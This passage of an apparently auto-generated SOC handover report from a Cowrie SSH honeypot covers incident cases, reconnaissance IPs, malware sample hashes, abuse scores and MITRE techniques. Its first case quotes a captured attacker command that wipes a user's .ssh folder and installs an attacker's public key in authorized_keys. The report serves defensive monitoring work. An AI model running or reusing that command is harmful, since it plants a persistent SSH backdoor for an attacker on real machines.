| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:39 |
| **Last Seen** | 2026-06-05 12:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:39:13` | `cowrie.session.connect` |
| `2026-06-05 12:39:13` | `cowrie.client.version` |
| `2026-06-05 12:39:13` | `cowrie.client.kex` |
| `2026-06-05 12:39:13` | `cowrie.login.success` |
| `2026-06-05 12:39:13` | `cowrie.session.params` |
| `2026-06-05 12:39:13` | `cowrie.command.input` |
| `2026-06-05 12:39:13` | `cowrie.command.failed` |
| `2026-06-05 12:39:14` | `cowrie.log.closed` |
| `2026-06-05 12:39:14` | `cowrie.session.params` |
| `2026-06-05 12:39:14` | `cowrie.command.input` |
| `2026-06-05 12:39:14` | `cowrie.session.file_download` |
| `2026-06-05 12:39:14` | `cowrie.log.closed` |
| `2026-06-05 12:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f1584ae3ac4

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:39 |
| **Last Seen** | 2026-06-05 12:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:39:16` | `cowrie.session.connect` |
| `2026-06-05 12:39:16` | `cowrie.client.version` |
| `2026-06-05 12:39:16` | `cowrie.client.kex` |
| `2026-06-05 12:39:17` | `cowrie.login.success` |
| `2026-06-05 12:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `49.207.40[.]162` | **30** | 2026-06-05 11:18 | 2026-06-05 12:29 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `158.178.141[.]16` | **20** | 2026-06-05 10:57 | 2026-06-05 11:42 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.47.208[.]106` | **16** | 2026-06-05 11:22 | 2026-06-05 12:43 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `49.207.245[.]79` | **13** | 2026-06-05 11:27 | 2026-06-05 11:55 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.111.178[.]165` | **9** | 2026-06-05 12:22 | 2026-06-05 12:43 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `81.170.248[.]221` | **6** | 2026-06-05 10:48 | 2026-06-05 11:10 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `123.13.41[.]128` | **3** | 2026-06-05 10:35 | 2026-06-05 10:48 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.143.11[.]150` | **2** | 2026-06-05 12:27 | 2026-06-05 12:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `114.216.2[.]84` | **2** | 2026-06-05 11:25 | 2026-06-05 12:26 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.178.83[.]104` | **2** | 2026-06-05 10:24 | 2026-06-05 10:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.221.25[.]213` | **2** | 2026-06-05 10:18 | 2026-06-05 10:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.158.23[.]150` | **2** | 2026-06-05 11:24 | 2026-06-05 11:30 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `36.64.68[.]99` | **2** | 2026-06-05 10:15 | 2026-06-05 10:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.61.122[.]229` | 1 | 2026-06-05 10:35 | 2026-06-05 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.117.152[.]139` | 1 | 2026-06-05 12:10 | 2026-06-05 12:11 | 37s | 0 | `T1592` | 🟢 LOW |
| `123.103.51[.]92` | 1 | 2026-06-05 10:41 | 2026-06-05 10:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]16` | 1 | 2026-06-05 10:14 | 2026-06-05 10:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]65` | 1 | 2026-06-05 10:31 | 2026-06-05 10:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.184.114[.]205` | 1 | 2026-06-05 10:29 | 2026-06-05 10:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-06-05 11:02 | 2026-06-05 11:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.169.72[.]1` | 1 | 2026-06-05 12:44 | 2026-06-05 12:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.112.133[.]74` | 1 | 2026-06-05 11:35 | 2026-06-05 11:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.89.252[.]58` | 1 | 2026-06-05 10:48 | 2026-06-05 10:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.6.224[.]135` | 1 | 2026-06-05 09:57 | 2026-06-05 09:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.36.75[.]227` | 1 | 2026-06-05 10:07 | 2026-06-05 10:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.171.171[.]102` | 1 | 2026-06-05 11:24 | 2026-06-05 11:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]42` | 1 | 2026-06-05 11:30 | 2026-06-05 11:31 | 15s | 0 | `T1592` | 🟢 LOW |
| `68.183.178[.]130` | 1 | 2026-06-05 12:28 | 2026-06-05 12:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.184.114[.]205` | BR | VERO S.A | **100** ⚠️ | 4 |
| `123.103.51[.]92` | CN | ChinaNetCenter Ltd. | **100** ⚠️ | 8 |
| `20.169.72[.]1` | US | Microsoft Corporation | **100** ⚠️ | 1 |
| `49.207.245[.]79` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 0 |
| `59.36.75[.]227` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `14.103.123[.]16` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `18.221.25[.]213` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `50.6.224[.]135` | US | Newfold Digital, Inc. | **100** ⚠️ | 43 |
| `158.178.141[.]16` | AU | Oracle Corporation | **100** ⚠️ | 50 |
| `123.13.41[.]128` | CN | China Unicom Henan province network | **100** ⚠️ | 29 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 145 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 45 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 23 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 175 cases |
| Tool 34  | Credential Extractor        | ✅ 136 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (3.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 45 priority case(s) shown individually · 28 recon entry/entries in table (13 group(s) consolidating 109 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-05T12:45:32Z_
